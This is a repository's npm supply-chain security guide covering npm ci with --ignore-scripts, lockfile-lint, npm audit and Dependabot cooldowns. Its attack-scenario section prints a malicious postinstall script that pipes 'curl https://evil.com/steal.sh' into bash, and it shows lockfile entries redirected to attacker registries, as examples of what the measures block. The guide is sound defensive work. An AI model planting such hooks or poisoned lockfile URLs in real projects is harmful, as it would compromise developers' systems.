# npm Security Best Practices

This document outlines npm security practices implemented in this repository, following recommendations from [Liran Tal's npm Security Best Practices](https://github.com/lirantal/npm-security-best-practices).

## 🔒 Security Status

All npm security best practices are implemented:

- ✅ Deterministic installations with `npm ci`
- ✅ Post-install script protection with `--ignore-scripts`
- ✅ Lockfile validation with `lockfile-lint`
- ✅ Vulnerability scanning with `npm audit`
- ✅ Supply chain attack prevention
- ✅ Secure package sources (npm registry only, HTTPS only)

---

## 🛡️ Implemented Security Measures

### 1. Deterministic Installation (`npm ci`)

**Implementation:**

```bash
npm ci --prefer-offline --ignore-scripts --no-audit --no-fund
```

**Benefits:**

- ✅ Enforces strict lockfile adherence
- ✅ Aborts if `package.json` and `package-lock.json` are out of sync
- ✅ Removes `node_modules` before installing (clean state)
- ✅ Faster than `npm install` in CI environments
- ✅ Prevents unintended version resolution

**Compliance:** This prevents supply chain attacks where an attacker compromises a dependency update.

---

### 2. Post-Install Script Protection

**Implementation:**

```bash
npm ci --ignore-scripts
npm run postinstall  # Controlled execution after security checks
```

**Why This Matters:**
Post-install scripts are a **common and recurring attack vector** for supply chain attacks. By disabling automatic script execution and running them manually after validation, we:

- ✅ Prevent arbitrary code execution during installation
- ✅ Control when and which scripts run
- ✅ Allow inspection of dependencies before script execution
- ✅ Mitigate malicious package installation attacks

**Our Approach:**

1. Install with `--ignore-scripts` to block automatic execution
2. Run `lockfile-lint` to validate package sources
3. Run `npm audit` to check for known vulnerabilities
4. Only then execute `npm run postinstall` (which runs `patch-package`)

**Why NOT in `.npmrc`?**

We intentionally do NOT set `ignore-scripts=true` in `.npmrc` because:

- ✅ Our `preinstall` script runs lockfile-lint BEFORE installation (good security layer)
- ✅ Our `postinstall` script runs patch-package (required for @doko-js patches)
- ✅ CI uses explicit `--ignore-scripts` flag with controlled execution
- ✅ Local development benefits from automatic script execution after lockfile validation

This hybrid approach provides security in CI while maintaining developer productivity locally.

**Workflow Example:**

```yaml
- name: Validate lockfile
  run: npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm --validate-https

- name: Install dependencies
  run: npm ci --prefer-offline --ignore-scripts --no-audit --no-fund

- name: Run npm audit
  run: npm audit --audit-level=high

# Safe to run postinstall after security checks pass
- name: Run postinstall
  run: npm run postinstall
```

---

### 3. Lockfile Validation (Supply Chain Protection)

**Implementation:**

```bash
npm run lint:lockfile
```

**What This Validates:**

- ✅ **Trusted registry only:** All packages must come from `registry.npmjs.org`
- ✅ **HTTPS enforcement:** All package URLs must use HTTPS protocol
- ✅ **Integrity hashing:** Validates SHA-512 checksums in lockfile
- ✅ **Package name validation:** Prevents typosquatting

**Protection Against:**

- ❌ Lockfile injection attacks
- ❌ Registry substitution attacks
- ❌ Man-in-the-middle attacks (HTTP downgrade)
- ❌ Compromised mirror attacks

**Example Attack Prevented:**
An attacker who gains write access to the repository could modify `package-lock.json` to point to a malicious package registry. `lockfile-lint` detects and blocks this:

```json
// ❌ BLOCKED by lockfile-lint
"resolved": "https://evil-registry.com/package/-/package-1.0.0.tgz"

// ✅ ALLOWED by lockfile-lint
"resolved": "https://registry.npmjs.org/package/-/package-1.0.0.tgz"
```

---

### 4. Vulnerability Scanning

**Implementation:**

```bash
# CI (strict enforcement)
npm audit --audit-level=high

# Local development (visibility)
npm audit --audit-level=moderate
```

**Two-Tier Strategy:**

| Environment | Threshold  | Purpose                    | Failures Include           |
| ----------- | ---------- | -------------------------- | -------------------------- |
| **CI**      | `high`     | Block only critical issues | High + Critical            |
| **Local**   | `moderate` | Visibility & awareness     | Moderate + High + Critical |

**Rationale:**

- ✅ **Local**: Developers see moderate+ issues for proactive fixes
- ✅ **CI**: Only high/critical issues block PRs (pragmatic)
- ✅ **Balance**: Security awareness without blocking productivity
- ✅ **SDK Publishing**: Published package has high standards

**Severity Levels:**

- **Critical**: Immediate action required, exploitable remotely
- **High**: Significant risk, should be fixed quickly
- **Moderate**: Context-dependent risk, evaluate and fix when practical
- **Low**: Minor risk or limited exploitability
- **Info**: Deprecations and best practices

**Complementary Tools:**

- ✅ **dependency-review-action**: PR-scoped vulnerability + license compliance (implemented)
- Consider adding **Snyk** for deeper vulnerability scanning
- Consider adding **Socket Security** for supply chain risk detection

---

### 5. Additional npm Flags

**`--prefer-offline`:**

- Uses local cache when possible
- Reduces network attack surface
- Faster installations

**`--no-audit`:**

- Skips automatic npm audit during install (we run it separately)
- Prevents noise during installation
- Allows controlled audit timing

**`--no-fund`:**

- Suppresses funding messages
- Reduces installation output
- Minor security benefit (less information disclosure)

---

### 6. Registry Locking via Dependabot

**Location:** `.github/dependabot.yml`

This repository does NOT use `.npmrc` for registry configuration. Instead, registry security is enforced through `lockfile-lint` validation which checks all lockfile URLs before installation.

**Note**: Dependabot's `registries` configuration requires authentication for npm-registry type, so we rely on `lockfile-lint` for registry enforcement instead.

**What This Prevents:**

- ✅ `lockfile-lint` validates all packages come from `registry.npmjs.org`
- ✅ Version range attacks (Dependabot uses `versioning-strategy: increase` for exact versions)
- ✅ Supply chain confusion (lockfile validation before every install)

**Complementary Protection:**

- `lockfile-lint` validates registry URLs in `package-lock.json` before every installation
- CLI flags (`--ignore-scripts`) in CI for controlled script execution
- `preinstall` hook validates lockfile before installation
- `postinstall` applies required patches

---

## 📋 npm Security Checklist

### Installation Security

- [x] Use `npm ci` instead of `npm install` in CI/CD
- [x] Use `--ignore-scripts` flag to prevent automatic script execution
- [x] Use `--prefer-offline` to reduce network exposure
- [x] Use `lockfile-lint` to validate registry sources before installation
- [x] Use Dependabot `versioning-strategy: increase` for exact versions
- [x] Use `--no-audit` and run audit separately for control
- [x] Validate lockfile before installation with `lockfile-lint`
- [x] Run vulnerability scans with `npm audit`
- [x] Manually execute postinstall scripts after security checks

### Lockfile Security

- [x] Validate packages come from npm registry only
- [x] Enforce HTTPS for all package URLs
- [x] Verify SHA-512 integrity hashes
- [x] Commit `package-lock.json` to version control
- [x] Never use `npm install --package-lock=false`

### Development Practices

- [x] Never commit `node_modules` to git
- [x] Use workspace protocol for monorepo dependencies
- [x] Pin action versions in CI workflows
- [x] Review dependency changes in PRs

### Publishing Security (SDK Package)

- [x] Use `prepublishOnly` script to ensure build before publish
- [x] Configure `publishConfig.access: public` explicitly
- [x] Separate publish scripts for different registries
- [ ] Enable npm 2FA with `auth-and-writes` (for maintainers)
- [ ] Consider npm provenance attestations (requires npm 9.5.0+)
- [ ] Consider OIDC trusted publishing (eliminates long-lived tokens)

---

## 🔍 Attack Scenarios Prevented

### 1. Malicious Post-Install Script

**Attack:** Compromised package runs malicious code during `npm install`

**Prevention:** `--ignore-scripts` blocks automatic execution

**Example:**

```json
// Malicious package.json
{
  "scripts": {
    "postinstall": "curl https://evil.com/steal.sh | bash"
  }
}
```

🛡️ **Blocked** - Script never executes automatically

---

### 2. Lockfile Poisoning

**Attack:** Attacker modifies lockfile to use malicious registry

**Prevention:** `lockfile-lint` validates registry URLs

**Example:**

```diff
{
  "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
+  "resolved": "https://attacker-mirror.com/lodash/-/lodash-4.17.21.tgz"
}
```

🛡️ **Blocked** - lockfile-lint fails on non-npm registry

---

### 3. Dependency Confusion

**Attack:** Attacker publishes malicious package with same name as private package

**Prevention:** Lockfile validation + registry restrictions

**Example:**

```bash
# Private package: @company/auth-lib (internal)
# Attacker publishes: @company/auth-lib (on npm)
```

🛡️ **Blocked** - lockfile-lint ensures consistent registry source

---

### 4. Compromised Dependency Update

**Attack:** Legitimate package is compromised in newer version

**Prevention:**

- Lockfile ensures version pinning
- `npm audit` detects known vulnerabilities
- Manual review of lockfile changes in PRs

**Example:**

```
event-stream@3.3.6 (safe) → event-stream@3.3.7 (compromised)
```

🛡️ **Detected** - Lockfile changes reviewed in PR, audit detects compromise

---

## 🚀 Advanced Security Recommendations

### Implemented

#### 1. **Dependency Cooldown Period** ✅

Dependabot is configured with cooldown periods to wait before adopting newly released packages:

| Update Type | Cooldown | Rationale                                           |
| ----------- | -------- | --------------------------------------------------- |
| **Patch**   | 7 days   | Allow community to discover issues                  |
| **Minor**   | 21 days  | Significant changes need longer validation          |
| **Major**   | 60 days  | 2-month buffer balances safety with maintainability |

Security updates **bypass all cooldowns** automatically.

See `.github/dependabot.yml` and `docs/DEPENDABOT-STRATEGY.md` for full configuration.

---

### Not Yet Implemented (Consider for Future)

#### 1. **npq - Package Quality Auditing**

Pre-installation security checks beyond npm audit.

```bash
npx npq install express
```

**Checks:**

- Package age and maturity
- Maintainer reputation
- Installation scripts inspection
- Typosquatting detection
- Vulnerability database checks

#### 2. **npm Provenance Attestations**

Cryptographic proof of package build origin (requires npm 9.5.0+).

**Benefits:**

- Verifies package was built in GitHub Actions
- Cryptographically signed build attestations
- Prevents compromised package uploads

**Implementation:**

```yaml
permissions:
  id-token: write # Required for OIDC
steps:
  - run: npm publish --provenance
```

#### 3. **OIDC Trusted Publishing**

Replace long-lived npm tokens with short-lived OIDC tokens.

**Benefits:**

- No token storage in repository secrets
- Automatic token rotation
- Scoped to specific workflows
- Eliminates token theft risk

#### 4. **Development Container Isolation**

Use dev containers to sandbox dependency execution.

**Benefits:**

- Limits blast radius of compromised dependencies
- Isolates malicious code from host system
- Reproducible development environments

---

## 📊 Security Tooling Matrix

| Tool                       | Purpose                     | Implemented | Status   |
| -------------------------- | --------------------------- | ----------- | -------- |
| `npm ci`                   | Deterministic installation  | ✅          | Active   |
| `--ignore-scripts`         | Block post-install scripts  | ✅          | Active   |
| `lockfile-lint`            | Lockfile validation         | ✅          | Active   |
| `npm audit`                | Vulnerability scanning      | ✅          | Active   |
| `dependency-review-action` | PR vuln + license gating    | ✅          | Active   |
| `zizmor`                   | Workflow security           | ✅          | Active   |
| `npq`                      | Package quality checks      | ❌          | Consider |
| `Snyk`                     | Deep vulnerability scanning | ❌          | Consider |
| `Socket Security`          | Supply chain risk detection | ❌          | Consider |
| `Dependabot`               | Automated updates           | ✅          | Active   |
| Provenance                 | Build attestations          | ❌          | Future   |
| OIDC Publishing            | Token-less publishing       | ❌          | Future   |

---

## 🔄 Workflow Integration

### Current Implementation

All workflows follow this security flow:

```yaml
1. Checkout code (persist-credentials: false)
2. Setup Node.js with npm caching
3. Validate lockfile (lockfile-lint)
4. Install dependencies (npm ci --ignore-scripts)
5. Run vulnerability scan (npm audit)
6. Execute postinstall scripts (if needed)
7. Run tests/build/deploy
```

### Example (on-pull-request-main.yml):

```yaml
- name: Validate lockfile
  run: npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm --validate-https

- name: Install dependencies
  run: npm ci --prefer-offline --ignore-scripts --no-audit --no-fund

- name: Run npm audit
  run: npm audit --audit-level=high

- name: Run postinstall
  run: npm run postinstall
```

---

## 🚨 Incident Response

### If a Compromised Dependency is Detected

1. **Immediate Actions:**

   - Review `npm audit` output for details
   - Check if compromised version is in lockfile
   - Isolate affected environments

2. **Investigation:**

   - Run `npm audit` locally
   - Review `package-lock.json` changes in recent PRs
   - Check for unexpected lockfile modifications

3. **Remediation:**

   - Update to patched version if available
   - Remove compromised dependency if no patch exists
   - Consider alternatives or workarounds
   - Run `lockfile-lint` to ensure clean state

4. **Post-Incident:**
   - Document the incident
   - Update security practices if needed
   - Consider stricter npm audit enforcement

---

## 📚 References

- [npm Security Best Practices (Liran Tal)](https://github.com/lirantal/npm-security-best-practices)
- [lockfile-lint](https://github.com/lirantal/lockfile-lint)
- [npm ci documentation](https://docs.npmjs.com/cli/v10/commands/npm-ci)
- [npm audit documentation](https://docs.npmjs.com/cli/v10/commands/npm-audit)
- [npm provenance](https://docs.npmjs.com/generating-provenance-statements)
- [Socket Security](https://socket.dev/)
- [Snyk](https://snyk.io/)

---

## 🎯 Next Steps

1. ✅ Implement `npm ci` with `--ignore-scripts`
2. ✅ Add `lockfile-lint` validation
3. ✅ Add `npm audit` to CI workflows
4. ✅ Add `dependency-review-action` for PR-scoped vulnerability + license gating
5. ✅ Configure Dependabot with cooldown strategy and registry locking
6. ⏳ Evaluate Snyk or Socket Security for deeper scanning
7. ⏳ Add npm provenance attestations for published packages
8. ⏳ Migrate to OIDC trusted publishing

---

**Last Updated:** 2026-01-12
**npm Version:** Uses version bundled with Node 24 (npm 11.x)
**Package Manager:** npm (with workspace support)
